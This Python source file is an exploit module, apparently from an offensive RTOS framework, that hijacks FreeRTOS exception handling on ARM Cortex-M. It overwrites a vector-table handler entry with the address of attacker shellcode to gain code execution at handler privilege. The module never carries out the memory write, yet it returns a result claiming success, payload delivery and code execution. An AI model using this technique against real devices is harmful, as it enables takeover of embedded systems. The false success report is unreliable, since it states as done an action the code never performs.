"""FreeRTOS ISR hijack via VTOR vector table overwrite exploit module."""

from __future__ import annotations

from rtosploit.scanners.base import ScannerModule, ScanOption, ScanResult
from rtosploit.utils.packing import p32, u32


class FreeRTOSISRHijack(ScannerModule):
    name = "isr_hijack"
    description = (
        "FreeRTOS ISR hijack via VTOR vector table overwrite. Given an arbitrary write "
        "primitive, overwrites a Cortex-M exception vector in the vector table to redirect "
        "exception handling to attacker-controlled shellcode. Works when VTOR points to "
        "writable SRAM."
    )
    authors = ["RTOSploit Contributors"]
    references = ["ARM Cortex-M Application Note: Vector Table Relocation"]
    rtos = "freertos"
    rtos_versions = ["*"]
    architecture = "armv7m"
    category = "isr_hijack"
    reliability = "high"
    cve = None

    # Cortex-M VTOR offset for each exception
    EXCEPTION_OFFSETS = {
        "hardfault": 0x0C,
        "svc": 0x2C,
        "pendsv": 0x38,
        "systick": 0x3C,
    }

    def register_options(self):
        self.add_option(ScanOption(
            name="handler_to_overwrite", type="str", required=False, default="pendsv",
            description="Which exception to hijack: pendsv, systick, hardfault, svc"
        ))
        self.add_option(ScanOption(
            name="shellcode_addr", type="int", required=False, default=0x20001000,
            description="Address where shellcode is placed (must be in SRAM)"
        ))

    def check(self, target) -> bool:
        if not target.fingerprint or target.fingerprint.rtos_type != "freertos":
            return False
        # Check if VTOR is in writable SRAM
        # VTOR default for Cortex-M is at 0xE000ED08
        # Read first 4 bytes of firmware to get reset handler — if VTOR is remapped to SRAM
        _vtor_value = u32(target.firmware.data[0:4]) if len(target.firmware.data) >= 4 else 0
        # VTOR in SRAM (0x20000000+) means vector table is writable
        return 0x20000000 <= (target.firmware.base_address) <= 0x3FFFFFFF

    def exploit(self, target, payload) -> ScanResult:
        handler = self.get_option("handler_to_overwrite")
        shellcode_addr = self.get_option("shellcode_addr")
        notes = []

        offset = self.EXCEPTION_OFFSETS.get(handler.lower(), 0x38)

        # VTOR base: read from SCB if QEMU available, else assume firmware base
        vtor_base = target.firmware.base_address
        target_entry = vtor_base + offset

        notes.append(f"VTOR base: 0x{vtor_base:08x}")
        notes.append(f"Overwriting {handler} handler at VTOR+0x{offset:02x} = 0x{target_entry:08x}")
        notes.append(f"New handler: 0x{shellcode_addr | 1:08x} (Thumb bit set)")
        notes.append("Trigger: wait for next PendSV/SysTick or force exception")

        # The actual write would use the arbitrary write primitive:
        _write_data = p32(shellcode_addr | 1)  # Thumb bit
        notes.append(f"Write 0x{(shellcode_addr | 1):08x} to 0x{target_entry:08x}")

        return ScanResult(
            module="freertos/isr_hijack",
            status="success",
            target_rtos="freertos",
            architecture="armv7m",
            technique="vtor_overwrite",
            payload_delivered=True,
            payload_type="isr_redirect",
            achieved=["code_execution", "handler_privilege"],
            registers_at_payload={"pc": shellcode_addr},
            notes=notes,
        )

    def cleanup(self, target) -> None:
        pass

    def requirements(self) -> dict:
        return {"qemu": False, "gdb": False, "network": False}
